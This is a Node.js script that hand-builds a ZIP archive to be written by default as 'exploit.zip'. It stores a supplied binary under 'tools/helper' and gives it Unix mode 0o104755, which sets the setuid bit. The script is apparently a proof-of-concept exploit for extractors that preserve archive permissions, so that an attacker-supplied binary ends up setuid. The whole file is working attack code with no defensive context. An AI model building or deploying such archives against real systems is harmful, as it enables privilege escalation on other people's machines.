const fs = require('fs');

function crc32(buffer) {
    let crc = 0xFFFFFFFF;
    for (let i = 0; i < buffer.length; i++) {
        crc ^= buffer[i];
        for (let j = 0; j < 8; j++) {
            crc = (crc >>> 1) ^ (crc & 1 ? 0xEDB88320 : 0);
        }
    }
    return (crc ^ 0xFFFFFFFF) >>> 0;
}

const inputPath = process.argv[2] || 'Verify';
const outputPath = process.argv[3] || 'exploit.zip';
const entryName = process.argv[4] || 'tools/helper';

if (!fs.existsSync(inputPath)) {
    console.error(`Missing input binary: ${inputPath}`);
    process.exit(1);
}

const fileData = fs.readFileSync(inputPath);
const fileNameBuffer = Buffer.from(entryName, 'utf8');

// S_IFREG (0o100000) | S_ISUID (0o004000) | 0755
const unixMode = 0o104755;
const externalAttributes = ((unixMode << 16) | 0x20) >>> 0;

// Local file header
const lfh = Buffer.alloc(30 + fileNameBuffer.length);
lfh.writeUInt32LE(0x04034b50, 0);
lfh.writeUInt16LE(20, 4);
lfh.writeUInt16LE(0, 6);
lfh.writeUInt16LE(0, 8);
lfh.writeUInt16LE(0, 10);
lfh.writeUInt16LE(0, 12);
lfh.writeUInt32LE(crc32(fileData), 14);
lfh.writeUInt32LE(fileData.length, 18);
lfh.writeUInt32LE(fileData.length, 22);
lfh.writeUInt16LE(fileNameBuffer.length, 26);
lfh.writeUInt16LE(0, 28);
fileNameBuffer.copy(lfh, 30);

// Central directory header
const cdh = Buffer.alloc(46 + fileNameBuffer.length);
cdh.writeUInt32LE(0x02014b50, 0);
cdh.writeUInt16LE(0x031e, 4); // Unix 3.0
cdh.writeUInt16LE(20, 6);
cdh.writeUInt16LE(0, 8);
cdh.writeUInt16LE(0, 10);
cdh.writeUInt16LE(0, 12);
cdh.writeUInt16LE(0, 14);
cdh.writeUInt32LE(crc32(fileData), 16);
cdh.writeUInt32LE(fileData.length, 20);
cdh.writeUInt32LE(fileData.length, 24);
cdh.writeUInt16LE(fileNameBuffer.length, 28);
cdh.writeUInt16LE(0, 30);
cdh.writeUInt16LE(0, 32);
cdh.writeUInt16LE(0, 34);
cdh.writeUInt16LE(0, 36);
cdh.writeUInt32LE(externalAttributes, 38);
cdh.writeUInt32LE(0, 42);
fileNameBuffer.copy(cdh, 46);

// End of central directory record
const eocd = Buffer.alloc(22);
eocd.writeUInt32LE(0x06054b50, 0);
eocd.writeUInt16LE(0, 4);
eocd.writeUInt16LE(0, 6);
eocd.writeUInt16LE(1, 8);
eocd.writeUInt16LE(1, 10);
eocd.writeUInt32LE(cdh.length, 12);
eocd.writeUInt32LE(lfh.length + fileData.length, 16);
eocd.writeUInt16LE(0, 20);

fs.writeFileSync(outputPath, Buffer.concat([lfh, fileData, cdh, eocd]));
console.log(`Generated: ${outputPath} -> ${entryName} (mode 0o${unixMode.toString(8)})`);
